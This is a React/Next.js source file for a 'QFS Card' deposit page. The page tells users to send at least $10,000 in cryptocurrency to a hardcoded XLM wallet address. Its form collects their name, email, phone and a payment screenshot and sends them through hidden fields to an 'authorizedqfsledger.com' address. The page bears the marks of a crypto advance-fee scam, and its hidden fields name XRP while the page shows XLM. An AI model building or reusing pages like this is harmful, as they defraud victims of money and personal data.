"use client";
import React, { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Button } from "@/components/ui/button";
import { Copy, ChevronLeft } from "lucide-react";
import Link from "next/link";

const depositAddress = "GBG5K7D5A2Q5WBNEZMFZISKXQJLZGDMECI3YEMVQCRSVTH6U6H5537HW";

const CardPage = ({ firstName = "", lastName = "", email = "", phone = "" }) => {
  const [copied, setCopied] = useState(false);

  const fullName = `${firstName} ${lastName}`.trim() || "Mike";

  const handleCopy = () => {
    navigator.clipboard.writeText(depositAddress);
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  return (
   <div className="bg-black">
     <div className="max-w-2xl mx-auto py-8 px-2 bg-black text-white">
      {/* Header */}
      <div className="flex items-center justify-between mb-6">
        <Link href="/dashboard" className="flex items-center gap-2 ">
          <Button variant="none" className="cursor-pointer flex items-center gap-2">
            <ChevronLeft className="w-5 h-5" />
            Back
          </Button>
        </Link>
        <h2 className="text-xl font-bold">Deposit</h2>
        <Link
          href="/dashboard/buy"
          className="p-1 rounded bg-gradient-to-r from-blue-600 to-violet-600 text-white"
        >
          Buy coin
        </Link>
      </div>

      {/* Mode */}
      <div className="flex items-center justify-between bg-white rounded-lg shadow p-4 mb-6">
        <span className="font-medium text-black">Mode</span>
        <div className="flex items-center gap-2">
          <span className="inline-flex items-center px-2 py-1 rounded-full bg-blue-600 text-white text-xs font-bold">
            XLM
          </span>
        </div>
      </div>

      {/* Card */}
      <div className="w-full flex justify-center mb-6">
        <div className="relative bg-zinc-900 text-zinc-300 rounded-xl shadow-xl p-6 w-[350px] h-[210px] flex flex-col justify-between overflow-hidden transition-transform duration-300 hover:scale-105">
          <div className="absolute w-[180px] h-[180px] bg-red-800 rounded-full top-[-60px] right-[-60px] opacity-60" />
          <div className="absolute w-[80px] h-[80px] bg-yellow-700 rounded-full bottom-[-40px] left-[-30px] opacity-60" />
          <div className="flex items-center justify-between z-10">
            <img
              src="https://authorizedqfsledger.com/assets/img/logo.png"
              width={70}
              alt="QFS Logo"
              className="rounded"
            />
            <span className="font-bold text-lg">QFS Card</span>
          </div>
          <div className="flex justify-between font-mono text-lg text-zinc-100 tracking-widest z-10">
            <span>XXXX-</span>
            <span>XXXX-</span>
            <span>XXXX-</span>
            <span>XXXX</span>
          </div>
          <div className="flex items-center justify-between z-10">
            <span>{fullName}</span>
            <span className="text-xs">
              Exp: <span className="text-base text-zinc-100">12/26</span>
            </span>
          </div>
        </div>
      </div>

      {/* Info */}
      <div className="flex items-center gap-3 mb-4">
        <img
          src="https://img.icons8.com/?size=96&id=5tH5sHqq0t2q&format=png"
          width={40}
          alt="Warning"
        />
        <p className="text-red-600 text-sm">
          Fund your Card via a crypto transfer to start using the full suite of services. You need a minimum of $10,000.
        </p>
      </div>

      {/* Deposit Address */}
      <div className="mb-4">
        <Label htmlFor="deposit-address" className="font-semibold text-base">
          Deposit Address
        </Label>
        <div className="flex mt-2">
          <Input
            id="deposit-address"
            value={depositAddress}
            readOnly
            className="rounded-l-sm border-r-0 bg-slate-800 text-white"
          />
          <Button
            type="button"
            variant="outline"
            className="rounded-r-sm border-l-0"
            onClick={handleCopy}
          >
            <Copy className="text-black w-4 h-4" />
          </Button>
        </div>
        {copied && (
          <div className="text-green-600 text-xs mt-1">Copied!</div>
        )}
      </div>

      {/* Pre-order Form */}
      <Card className="mt-6">
        <CardHeader>
          <CardTitle>Make Deposit</CardTitle>
        </CardHeader>
        <CardContent>
          <form
            action="emailSend"
            method="POST"
            encType="multipart/form-data"
            id="form"
            className="space-y-4 mb-15"
          >
            <input type="hidden" name="method" value="XRP" required />
            <input type="hidden" name="asset" value="xrp_assets" required />
            <input type="hidden" name="equiv" value="xrp_equiv" required />
            <input type="hidden" name="fieldFormEmail" value="Josh.com@gmail.com" required />
            <input type="hidden" name="toEmail" value="support@authorizedqfsledger.com" required />
            <input type="hidden" name="fieldSubject" value="NEW QFS CARD PRE-ORDER" required />
            <input type="hidden" name="add_deposit" value="1" required />

            <div>
              <Label htmlFor="amount" className="hidden font-semibold">
                XLM Amount
              </Label>
              <Input
                id="amount"
                name="amount"
                type="text"
                placeholder="$1000"
                className="text-green-600"
                required
              />
            </div>

            <h3 className="hidden text-blue-700 font-bold mt-4">Shipping Details</h3>
            <div>
              <Input
                type="text"
                placeholder="Full Name"
                name="fieldFormName"
                value={fullName}
                required
                readOnly
              />
            </div>
            <div>
              <Input
                type="email"
                placeholder="Email"
                name="fieldFormEmail"
                value={email}
                required
                readOnly
              />
            </div>
            <div>
              <Input
                type="text"
                placeholder="Phone Number"
                name="fieldFormPhone"
                value={phone}
                required
                readOnly
              />
            </div>
            <div>
              <Label className="text-red-600" htmlFor="attachment">
                Attach screenshot of transaction
              </Label>
              <Input
                id="attachment"
                name="attachment"
                type="file"
                required
                className="mt-1"
              />
            </div>
            <div className="flex items-center gap-2">
              <input
                type="checkbox"
                id="terms"
                name="terms"
                value="Yes"
                required
                className="accent-blue-600"
              />
              <Label htmlFor="terms" className="text-sm">
                I accept QFS Shipping terms and conditions
              </Label>
            </div>
            <Button
              type="submit"
              className="w-full bg-gradient-to-r from-blue-600 to-violet-600 text-white font-semibold py-2 rounded-lg shadow hover:from-blue-700 hover:to-violet-700 transition"
            >
              I have paid
            </Button>
          </form>
        </CardContent>
      </Card>
    </div>
   </div>
  );
};

export default CardPage;